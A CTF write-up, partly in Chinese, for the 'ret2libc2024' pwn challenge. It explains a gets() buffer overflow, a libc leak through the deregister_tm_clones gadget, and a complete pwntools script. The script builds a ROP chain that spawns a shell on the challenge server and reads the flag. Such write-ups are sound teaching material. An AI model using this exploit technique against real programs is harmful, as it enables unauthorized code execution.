---
title: NCKUCTF ret2libc2024 WriteUp
date: 2024-08-16 21:49:01
category: PWN
tags: 
    - pwn
    - ctf
excerpt: ret2libc without `pop rdi`
---

## ret2lbic2024

```c
#include <stdio.h>

int main(){
    setvbuf(stdin,0,_IONBF,0);
    setvbuf(stdout,0,_IONBF,0);
    char buf[32];
    printf("Can you exploit buffer overflow in 2024?");
    gets(buf);
}
```

---

> 能用的gadget都沒有，我們可以使用 `deregister_tm_clones` 這個 function 有個神奇的東西 (如下圖)
>這邊就會直接幫我們把rax設為0x404040（也就是stdout@GLIBC_2.2.5，call 完這個 function 後，我們只需要 call 回 main 中控制 printf 的 `mov rdi,rax` 就可以 leak 出 libc base，後面一樣用 libc 堆 rop chain 就可以了。

![image](/images/rop4-detmclone.png)

---

+ 在leak的時候需要注意不能把`$rbp`寫壞，因為下次`gets()`還需要一個stack空間存東西，所以隨便找一個可寫的空間給`$rbp`跳過去後面才不會crash掉。
+ 為什麼 offset 不是用 `stdout@@GLIBC_2.2.5`
    `stdout@@GLIBC_2.2.5` 是一個指向 `_IO_2_1_stdout_` 結構的指標，而 `_IO_2_1_stdout_` 是實際的 FILE 結構體。
    使用 `_IO_2_1_stdout_` 可以直接操作該結構體的memory，而不是通過指標間接訪問它。這樣可以避免偏移計算中的錯誤，也可以更精確地控制內存中的值。

---

## Exploitation

```python
from pwn import *
import warnings

# context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'
warnings.filterwarnings("ignore", category=BytesWarning)

# r = process('./chal')
r= remote('140.116.246.190',8789)

l = ELF("libc.so.6")

# printf 在設定rdi時 是用 mov rdi, rax
ret = 0x40101a
detmclone = 0x4010d0 # 會把rax設成 stdout
mov_rdi_rax = 0x4011c5

bss = 0x404100

p = flat(
    b'a'*0x20,
    bss,
    ret,
    detmclone,
    mov_rdi_rax
)

# gdb.attach(r)

r.sendlineafter(b'2024?',p)

log.info("stdout -> %s" % hex(l.symbols['stdout']))
l.address = u64(r.recv(6).ljust(8,b'\0')) - 0x21A780

success("base address -> %s" % hex(l.address)) 

pop_rdi = l.address + 0x2a3e5
pop_rsi = l.address + 0x2be51
pop_rax = l.address + 0x45eb0
pop_rdx_rbx = l.address + 0x90529
syscall = l.address + 0x29db4
sh = l.address + 0x1D8698

log.info("sh: %s" % hex(sh))

p2 = flat(
    b'a'*0x28,
    pop_rdi,
    sh,
    pop_rax,
    0x3b,
    pop_rsi,
    0x0,
    pop_rdx_rbx,
    0x0,0x0,
    ret,
    syscall
)

# gdb.attach(r)

r.sendline(p2)

r.sendline(b'cat /home/$(whoami)/flag*')

r.interactive()

```
